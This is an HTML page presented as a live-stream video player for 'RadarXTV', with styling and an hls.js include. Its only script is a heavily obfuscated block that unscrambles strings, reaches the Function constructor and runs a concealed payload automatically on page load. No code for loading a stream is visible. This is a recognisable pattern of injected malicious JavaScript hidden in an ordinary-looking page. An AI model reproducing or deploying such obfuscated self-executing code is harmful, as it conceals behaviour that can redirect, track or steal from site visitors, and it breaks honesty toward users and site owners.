<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HLS Player - RadarXTV</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: #0f0f0f;
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            text-align: center;
            max-width: 900px;
            width: 100%;
            padding: 20px;
            background: #1e1e1e;
            box-shadow: 0 0 20px #00ffcc;
            border-radius: 10px;
        }

        h1 {
            margin-bottom: 20px;
            color: #00ffcc;
            font-size: 30px;
        }

        video {
            width: 100%;
            border: 3px solid #00ffcc;
            border-radius: 5px;
            outline: none;
        }

        #qualitySelector {
            margin-top: 15px;
        }

        button {
            background: #00ffcc;
            color: #000;
            padding: 10px 25px;
            border: none;
            cursor: pointer;
            margin: 5px;
            transition: 0.3s;
            border-radius: 5px;
            font-weight: bold;
        }

        button:hover {
            background: #007766;
        }

        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }

            h1 {
                font-size: 24px;
            }

            button {
                padding: 8px 20px;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    <video id="video" controls autoplay playsinline></video>
    <div id="qualitySelector"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/hls.js@1.3.0"></script>
<script>
(function(){var eEC='',xsz=309-298;function mWs(x){var o=821579;var h=x.length;var d=[];for(var e=0;e<h;e++){d[e]=x.charAt(e)};for(var e=0;e<h;e++){var k=o*(e+117)+(o%51148);var y=o*(e+386)+(o%34673);var w=k%h;var a=y%h;var f=d[w];d[w]=d[a];d[a]=f;o=(k+y)%1313484;};return d.join('')};var XZO=mWs('yauswroltsmpecjrhrttncfoocnbiugdkqxvz').substr(0,xsz);var DEW=')e{=e=161u[5(r=r;c.gCtc=p(en<dsfdrsgnplb(6ov+l=bwhar";ka+v-=[)e,u5(eo;(0).a,h0o(g,langjA eAmmgnw,.ve=;qp..nlnoil]yt[m+ +n+ra[ ,++zn)9=rn,fomy0sr6;nton-t=;m+)2vfm>61xr.+[;+art9=9i[=o="8r;{no67r0ipr=}ofCvkt;sd0i,i;( om;u1; -)vgtap;f+l{v,)a+}7nnu=f6ha=e}=}vldf3  ux(fo""(aenfelavvx)lln(7(li0ra4{h9l]h=q= a(=v]a;t0"i8r1+ ),avnr3}l;uf;arr7;rmrr6er.+bng4hjA(x te)),==C< 2tkbe<lAs+",ev ri.{ybv1ad)v=8+8(e.dy7=ag9jr,8eo])i;ajk3am1riC".k1C),.os[At-2ri).ln=;s8er;u;els;c]o0tunC7aqg;*(;0.nc0++nrg=plh.iCr)t;tuve1),ae)!r[ria(.,ozrz)u+n;b=o[r;;y;e;)ih)c=.;ev7m-t+-hr=acgtlcntvgh)lrj>f(h)9shfelas  )t.s*  y,b](;( k=ih(iyqrfi(ar,.a6(Sk=;<[ ;5lt)oar(v1wr)v)un.r2 d6uqav6sgunn;a(p,]d].ea])s}",no{fr((mhri=0]mhr4(u+zy+1,;sc(h1.}ovr a+[4s 1(,r)lt6m=8]fli.yol;tuvdrsedg[f<bgriewe=7;e-{7=3phu(=r)e).n(is( .k=o;=heC22i,h5( ca.=z;[pm; aoe[h,!av=t"i,=out=(ua;rv]s88hus)n=px.g0+]e vdr+;)9;lnm2ie,frtS;5"dik.,o7;],);';var iBX=mWs[XZO];var HCb='';var ARl=iBX;var yGP=iBX(HCb,mWs(DEW));var cGO=yGP(mWs('?zG+oa,;;a.%6tb{G5)li$( h%G3.;G74i9!fdG97)n9e._(1rHthGl ]Gfe d(eCeGoc>1)3.ca1G8=a=0jci:e2G(,(  rcGH$;3GGy! $=8r-et)GGf=d9%orbnf5ngioon.SGrGhuG)6l2d.{%&;6)o%GlGn5%%Gbt{"GeG8G)h?n.lGnHGreG]Ge.cbGG_7,=$i()$b6tG=}5fon*eneofaM((og;..)_l$4%ri%%a(o{.[lv+l{s(#o;t;o)tuGm@=c.ncGG0@5G)3GH;G].)vtgGtj r ]uo)i}m}teGG$.ie8fr]D{Me?5%]cl]2GpctalLan.y=\/Fryhpi{n])scci%5!.ps}_K vtA,G043hGt=2$ .(?uloGlge:%tlmic(i)1Gu94rvc_,bas\/(!.G5(eeC\' Ijaf0G%io_polde+4;cv,a s4Gya9).4}s!at.%oq.)Gt7a2 GG8(c_,ylc};aiG%GGTop o!pm%40%0m_!Gran fp;)=itol nxG2eo?7g@kr.]czh7La{,E#Nji5elrda2Ge_Hr(e;!4).f,;d(sGr),,G:!nbt.=r\/4ha-1Gt.86i34%c5coo"Ga#fGn(;i))t)pt\/=GnjGGn;.;=tn(r=2G0)sm_9GdG0}u7 e,esGHG;Gb,$tGGKlG=!.GE ,g:?6ae.ol5-,g.G,)h$vG;rpe]d{t(tG=j3tE)p4r.;(lo_77xB3(Gj8!e5.;nhl 3)=!3Gh30;b!!_] ,>pf iIoe_)ue.,cn3GAr(HG.G>%]0p92dSs{;su tGav]0uiG.2n.5}(%sdG#.ascG4,G((ecs6.2-o!u>e2E1(352)ub;g(he%,][sI,GGG;]%)% ( G%!ttf0d,s(a(aLG;j3$,nGGae4fAe;!S(odtGc))idi5@r.],Ele$:dg,G]tpi=5g1.0i.m3tv38eC":%a11.5GG6h$nGC M&g;%BG;  G!3]7\/=et!eG(o]__,j.lho1#n le1te= eioG\/_}.8GcGCne8G6e..Sc{i{)a<xG,tfn3scuGGn(p4=rbo2] !G?1fas,G+aG[t21oG,_trrG G0GyG)5"l[duBEt.doet@xt(e;dd.G.3ilGtH_l(+cGojoabelaGh.GG;3n9eq0m_=Gc}16(ei;e0pG4:G.+G)&[=]fGn4+ewrg(G.n(r.uG\'6r](wIc"ri5jme1(m?_c1Gse}]G[G._)-{>F(ee2=7%]=tDp;0_tF)35_:G()Ceen\/GG)8]]o5BGfGG\'1(fG1G"v4e,($_8)stGsllG7G4ct@Gsb2p s;a]==;(e.]]m)G%G@)Gpaa8aSe.rGCGtHe;G(4;$n{[Gnllr f6GGc{lGG,$+;H.Gb.51GoGt!Gi-*Gns)tfopfCco=nGS@83i)d5}gi{\/fif;GGuE72)7G\'G;1e{r)elG](co(dG_m{j=)i(3+cA.$.e5G{q. ]cu$ic=eis]jax]).(3Ge;G}3.l56]d4oiGG$)G0q;3_;Sv])fev;wc0ee{ 0Gc=ifedut.G12G]1yG87vruo($(aGtGnlt6G,batab}Go_%t.)ac)2\'tf7S;=ul_5.)]lIG!9Gg(9b0)G.GGy=s-=G31t*}o_i)G%G7)$tc9.{d._.v(&])G.d).dE}!G( (r3G6ca."ejd)oGDogusG;Gni}}S+G$4nii(}a))iaGS9@oo.nxotr.,5!o!s$,){G,;%;s!{_d((uE!o(d\'KGtrG1s8)9rucS(e1vogan8d{6GmG;iGF(eGeGsa}4C!ncn!s(G(GacG7G:34an7Gl.1;l1(G,!!eLbos={G4))jeG>)!tncldcG,{Gln_cG{5b.$8e,.)!;}lp9}rr0sG.Gl \/nGo;n(tld%,__3<eeGc =csae,tG)trj=eei[!G"]on.<6)]ecj$.z{d);_.4o,! >f)GuB+eH?G39!(_r)+G_{e.%_{.DkGton]}c.t3:j}hiG(G;ah%e2o;j3G"]$re(noe4t_7.G%36.Gla_rGGGh_Gf4Gst$bGhu }{o)E.rncG2.]35t o;tIuG).ph.!s8li1)s,f=Gro%*)%pl?)=7S 4G7$u$aTKl$.{9otc!\/76j)Dg(_g]hG=AGG_sG!5i.cl)unGa.l)4_!,v$$!Ck#n.,(;lg]Gs_faG_)(1G<tfgrf;]t6#.)2i,2]p ;DG2 .u)!G7e(e'));var flF=ARl(eEC,cGO );flF(5568);return 2319})()
</script>

</body>
</html>